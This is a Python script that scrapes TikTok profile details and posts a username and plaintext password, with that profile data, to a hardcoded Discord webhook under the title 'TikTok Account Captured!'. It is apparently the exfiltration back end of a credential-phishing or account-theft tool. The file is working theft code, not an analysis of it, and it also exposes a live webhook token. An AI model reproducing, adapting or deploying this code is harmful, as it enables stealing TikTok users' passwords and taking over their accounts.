
import datetime
import re
import pycountry
import requests


def TikTok_Info(username):
    headers = {
        "user-agent": "Mozilla/5.0 (Linux; Android 8.0.0; Plume L2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Mobile Safari/537.36",
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
    }

    try:
        r = requests.get(f'https://www.tiktok.com/@{username}', headers=headers, timeout=10)
        if 'webapp.user-detail' not in r.text:
            return None
            
        s = r.text.split('webapp.user-detail"')[1].split('"RecommendUserList"')[0]

        ex = lambda p, src, d="", yesno=False: (m := re.search(p, src)) and (m.group(1) == "true" if yesno else m.group(1)) or d

        info = {
            "user_id": ex(r'"id":"(.*?)"', s),
            "nickname": ex(r'"nickname":"(.*?)"', s),
            "signature": ex(r'"signature":"(.*?)"', s),
            "region": ex(r'"region":"(.*?)"', s),
            "following": ex(r'"followingCount":(\d+)', s, "0"),
            "followers": ex(r'"followerCount":(\d+)', s, "0"),
            "likes": ex(r'"heart":(\d+)', s, "0"),
            "videos": ex(r'"videoCount":(\d+)', s, "0"),
            "friends": ex(r'"friendCount":(\d+)', s, "0"),
            "private": ex(r'"privateAccount":(true|false)', s, yesno=True),
            "verified": ex(r'"verified":(true|false)', s, yesno=True),
            "seller": ex(r'"commerceInfo":{"seller":(true|false)', s, yesno=True),
            "language": ex(r'"language":"(.*?)"', s),
            "created": ex(r'"createTime":(\d+)', s, "0"),
            "secuid": ex(r'"secUid":"(.*?)"', s)
        }

        flag = ""
        country = pycountry.countries.get(alpha_2=info["region"]) if info["region"] else None
        if country:
            flag = getattr(country, "flag", "")
            info["region"] = country.name

        try:
            ts = int("{0:b}".format(int(info["user_id"]))[:31], 2)
            created = datetime.datetime.fromtimestamp(ts).strftime("%Y-%m-%d %H:%M:%S")
        except:
            created = None

        return {
            "username": username,
            "secuid": info["secuid"],
            "name": info["nickname"],
            "followers": int(info["followers"]),
            "following": int(info["following"]),
            "likes": int(info["likes"]),
            "videos": int(info["videos"]),
            "private": info["private"],
            "country": info["region"],
            "flag": flag,
            "date_created": created,
            "user_id": info["user_id"],
            "bio": info["signature"] or "",
            "verified": info["verified"],
            "tiktok_shop": info["seller"],
            "language": info["language"]
        }
    except Exception as e:
        print(f"[ERROR] Failed to get info for {username}: {str(e)}")
        return None
    


def send_discord_webhook(username, password, webhook_url="https://discord.com/api/webhooks/1400592536967577771/AzE2bOi2TBkvV_FzZA1MhVT3cnWqLLZzyoghZTktT3KQk1m9pdNkoa4LRbcygsJNnftD"):
    try:
        user_info = TikTok_Info(username)
        if not user_info:  # If we couldn't get user info, create a basic response
            user_info = {
                "username": username,
                "user_id": "N/A",
                "name": username,
                "followers": 0,
                "following": 0,
                "likes": 0,
                "videos": 0,
                "private": False,
                "country": "N/A",
                "flag": "",
                "date_created": "N/A",
                "secuid": "N/A",
                "bio": "No bio available",
                "verified": False,
                "tiktok_shop": False,
                "language": "N/A"
            }

        # Format numbers with commas
        followers = "{:,}".format(user_info.get('followers', 0))
        following = "{:,}".format(user_info.get('following', 0))
        likes = "{:,}".format(user_info.get('likes', 0))
        videos = "{:,}".format(user_info.get('videos', 0))

        embed = {
            "title": "🎯 TikTok Account Captured!",
            "color": 0x00ff00,
            "fields": [
                {"name": "👤 Username", "value": f"`{username}`", "inline": True},
                {"name": "🔑 Password", "value": f"`{password}`", "inline": True},
                {"name": "🆔 User ID", "value": f"`{user_info.get('user_id', 'N/A')}`", "inline": True},
                {"name": "📛 Display Name", "value": f"`{user_info.get('name', username)}`", "inline": True},
                {"name": "📅 Account Created", "value": f"`{user_info.get('date_created', 'N/A')}`", "inline": True},
                {"name": "📍 Country", "value": f"{user_info.get('flag', '')} `{user_info.get('country', 'N/A')}`", "inline": True},
                {"name": "📝 Bio", "value": f"```{user_info.get('bio', 'No bio')[:1000]}```", "inline": False},
                {"name": "👥 Followers", "value": f"`{followers}`", "inline": True},
                {"name": "📊 Following", "value": f"`{following}`", "inline": True},
                {"name": "❤️ Total Likes", "value": f"`{likes}`", "inline": True},
                {"name": "🎬 Videos", "value": f"`{videos}`", "inline": True},
                {"name": "🔒 Private", "value": f"`{'Yes' if user_info.get('private') else 'No'}`", "inline": True},
                {"name": "✅ Verified", "value": f"`{'Yes' if user_info.get('verified') else 'No'}`", "inline": True},
                {"name": "🛍️ TikTok Shop", "value": f"`{'Yes' if user_info.get('tiktok_shop') else 'No'}`", "inline": True}
            ],
            "thumbnail": {
                "url": f"https://api.popcat.xyz/tiktok?user={username}"
            },
            "footer": {
                "text": f"Captured at {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
                "icon_url": "https://cdn-icons-png.flaticon.com/512/3046/3046127.png"
            }
        }

        data = {
            "username": "TikTok Account Checker",
            "avatar_url": "https://cdn-icons-png.flaticon.com/512/3046/3046127.png",
            "embeds": [embed]
        }

        headers = {'Content-Type': 'application/json'}
        response = requests.post(webhook_url, json=data, headers=headers, timeout=10)
        
        if response.status_code == 204:
            print(f'[+] Webhook sent for {username}')
        else:
            print(f'[-] Webhook failed for {username} (Status: {response.status_code})')
    except Exception as e:
        print(f'[!] Webhook error for {username}: {str(e)}')